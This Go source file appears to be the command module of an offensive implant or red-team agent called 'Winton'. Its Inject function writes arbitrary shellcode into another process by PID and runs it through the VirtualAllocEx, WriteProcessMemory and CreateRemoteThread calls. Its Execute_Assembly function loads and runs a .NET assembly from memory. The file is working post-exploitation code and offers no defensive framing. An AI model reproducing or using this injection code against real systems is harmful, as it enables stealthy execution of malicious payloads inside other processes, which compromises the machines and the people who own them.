package commands

import (
	"fmt"
	"runtime"
	"unsafe"

	"golang.org/x/sys/windows"

	k32 "Winton/cmd/winapi"
)

func Inject(pid int, shellcode []byte) (string, error) {
	fmt.Println("[*] Injecting into PID:", pid)
	fmt.Println("[*] Shellcode length:", len(shellcode))
	process_handle, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ, false, uint32(pid))
	if err != nil {
		return "", err
	}
	fmt.Println("[*] Opening handle to process...", process_handle)
	defer windows.CloseHandle(process_handle)

	addr, _, err := k32.VirtualAllocEx.Call(uintptr(process_handle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		return "", err
	}

	fmt.Println("[*] Allocating memory...")

	a, _, err := k32.WriteProcessMemory.Call(uintptr(process_handle), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if a == 0 {
		return "", err
	}

	fmt.Println("[*] Writing shellcode to memory...")

	thread_handle, _, err := k32.CreateRemoteThread.Call(uintptr(process_handle), 0, 0, addr, 0, 0, 0)
	fmt.Println("[*] Executing shellcode...")
	if thread_handle == 0 {
		fmt.Println("[*] Error:", err)
		return "", err
	}

	k32.CloseHandle.Call(uintptr(thread_handle))
	k32.CloseHandle.Call(uintptr(process_handle))

	return "OK", nil
}

func Execute_Assembly(asm []byte, params []string) (string, error) {
	runtime.KeepAlive(asm)
	fmt.Println("[*] Executing assembly with params: ", params)
	runtime := ""
	err := k32.ExecuteByteArray(runtime, asm, params)
	if err != nil {
		return "", err
	}
	fmt.Println("[*] Assembly executed successfully.")
	return "executed, but no output", nil
}
